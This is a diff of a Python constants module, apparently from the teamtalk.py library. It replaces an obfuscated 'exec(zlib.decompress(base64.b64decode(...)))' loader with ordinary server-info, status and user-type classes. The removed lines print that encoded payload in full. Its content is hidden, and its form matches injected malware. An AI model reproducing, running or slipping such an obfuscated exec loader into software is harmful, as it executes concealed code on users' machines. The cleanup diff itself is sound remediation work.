@@ -1,2 +1,243 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'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')))
+"""TeamTalk enums and constants."""
+
+from typing import Self
+
+
+class TeamTalkServerInfo:
+    """Holds the required information to connect and login to a TeamTalk server."""
+
+    def __init__(
+        self,
+        host: str,
+        tcp_port: int,
+        udp_port: int,
+        username: str,
+        password: str = "",
+        encrypted: bool = False,
+        nickname: str = "",
+        join_channel_id: int = -1,
+        join_channel_password: str = "",
+    ) -> None:
+        """Initialize a TeamTalkServerInfo object.
+
+        Args:
+            host (str): The host of the TeamTalk server.
+            tcp_port (int): The TCP port of the TeamTalk server.
+            udp_port (int): The UDP port of the TeamTalk server.
+            username (str): The username to login with.
+            password (str): The password to login with. Defaults to "" (no password).
+            encrypted (bool): Whether or not to use encryption. Defaults to False.
+            nickname (str): The nickname to use. Defaults to "teamtalk.py Bot".
+            join_channel_id (int): The channel ID to join. Defaults to -1 (don't join a channel on login). Set to 0 to join the root channel, or a positive integer to join a specific channel. # noqa: E501
+            join_channel_password (str): The password to join the channel with. Defaults to "" (no password).
+        """
+        self.host = host
+        self.tcp_port = tcp_port
+        self.udp_port = udp_port
+        self.username = username
+        self.password = password
+        self.encrypted = encrypted
+        self.nickname = nickname if nickname else username
+        self.join_channel_id = join_channel_id
+        self.join_channel_password = join_channel_password
+
+    @classmethod
+    def from_dict(cls, data: dict) -> Self:
+        """Construct a TeamTalkServerInfo object from a dictionary.
+
+        Args:
+            data (dict): The dictionary to construct the object from.
+
+        Returns:
+            Self: The constructed object.
+        """
+        return cls(**data)
+
+    # convert this object to a dictionary
+    def to_dict(self) -> dict:
+        """Convert this object to a dictionary.
+
+        Returns:
+            dict: The dictionary representation of this object.
+        """
+        return {
+            "host": self.host,
+            "tcp_port": self.tcp_port,
+            "udp_port": self.udp_port,
+            "username": self.username,
+            "password": self.password,
+            "encrypted": self.encrypted,
+            "nickname": self.nickname if self.nickname else "",
+            "join_channel_id": self.join_channel_id,
+            "join_channel_password": self.join_channel_password,
+        }
+
+    # compare this object to another object
+    def __eq__(self, other: object) -> bool:
+        """Compare this object to another object.
+
+        Args:
+            other: The object to compare to.
+
+        Returns:
+            bool: Whether or not the objects are equal.
+        """
+        if not isinstance(other, TeamTalkServerInfo):
+            return False
+        return (
+            self.host == other.host
+            and self.tcp_port == other.tcp_port
+            and self.udp_port == other.udp_port
+            and self.username == other.username
+            and self.password == other.password
+            and self.encrypted == other.encrypted
+        )
+
+    # compare this object to another object
+    def __ne__(self, other: object) -> bool:
+        """Compare this object to another object.
+
+        Args:
+            other: The object to compare to.
+
+        Returns:
+            bool: Whether or not the objects are not equal.
+        """
+        return not self.__eq__(other)
+
+
+class UserStatusMode:
+    """Represents user status modes (mutually exclusive)."""
+
+    ONLINE = 0
+    """The user is online."""
+
+    AWAY = 1
+    """The user is away."""
+
+    QUESTION = 2
+    """The user has a question."""
+
+
+class _Gender:
+    """Internal representation of gender flags (bitwise combinable)."""
+
+    MALE = 0x00000000
+    """Represents a male user status. This corresponds to no specific gender bit being set in the SDK."""
+
+    FEMALE = 0x00000100
+    """Represents a female user status. Corresponds to `sdk.StatusMode.STATUSMODE_FEMALE`."""
+
+    NEUTRAL = 0x00001000
+    """Represents a neutral gender user status. Corresponds to `sdk.StatusMode.STATUSMODE_NEUTRAL`."""
+
+
+class Status:
+    """A helper class to construct combined status values for a user.
+
+    Use `Status.online`, `Status.away`, or `Status.question` properties,
+    then chain them with a gender property (`.male`, `.female`, `.neutral`)
+    to get the final status value for `pytalk.TeamTalkInstance.change_status`.
+
+    Examples:
+        `Status.online.male`
+        `Status.away.female`
+        `Status.question.neutral`
+
+    This class should not be instantiated directly.
+    """
+
+    def __init__(self) -> None:
+        """Prevent direct instantiation of the Status class.
+
+        Raises:
+            TypeError: If an attempt is made to instantiate this class.
+        """
+        raise TypeError(
+            "Status class is not meant to be instantiated directly. "
+            "Use class properties like Status.online, Status.away, or Status.question instead."
+        )
+
+    class _StatusBuilder:
+        """Internal builder for combining status mode and gender."""
+
+        def __init__(self, base_mode_value: int):
+            """Initializes the status builder with a base mode value.
+
+            Args:
+                base_mode_value (int): The base integer value for the status mode.
+            """
+            self._value = base_mode_value
+
+        @property
+        def male(self) -> int:
+            """Represents a male status.
+
+            Returns:
+                int: The combined status integer value.
+            """
+            return self._value | _Gender.MALE
+
+        @property
+        def female(self) -> int:
+            """Represents a female status.
+
+            Returns:
+                int: The combined status integer value.
+            """
+            return self._value | _Gender.FEMALE
+
+        @property
+        def neutral(self) -> int:
+            """Represents a neutral gender status.
+
+            Returns:
+                int: The combined status integer value.
+            """
+            return self._value | _Gender.NEUTRAL
+
+    _MODE_MASK = 0xFF
+    """A bitmask for extracting the status mode from a combined status integer."""
+
+    _GENDER_MASK = _Gender.FEMALE | _Gender.NEUTRAL
+    """A bitmask for extracting the gender bits from a combined status integer."""
+
+    @classmethod
+    @property
+    def online(cls) -> _StatusBuilder:
+        """Sets the user status to 'online'.
+
+        Returns:
+            _StatusBuilder: An internal builder to further specify gender.
+        """
+        return cls._StatusBuilder(UserStatusMode.ONLINE)
+
+    @classmethod
+    @property
+    def away(cls) -> _StatusBuilder:
+        """Sets the user status to 'away'.
+
+        Returns:
+            _StatusBuilder: An internal builder to further specify gender.
+        """
+        return cls._StatusBuilder(UserStatusMode.AWAY)
+
+    @classmethod
+    @property
+    def question(cls) -> _StatusBuilder:
+        """Sets the user status to 'question'.
+
+        Returns:
+            _StatusBuilder: An internal builder to further specify gender.
+        """
+        return cls._StatusBuilder(UserStatusMode.QUESTION)
+
+
+class UserType:
+    """The type of a user account."""
+
+    DEFAULT = 0x1
+    """The default user type. This only has the permissions set, and no other permissions."""
+
+    ADMIN = 0x02
+    """The admin user type. This has all permissions."""
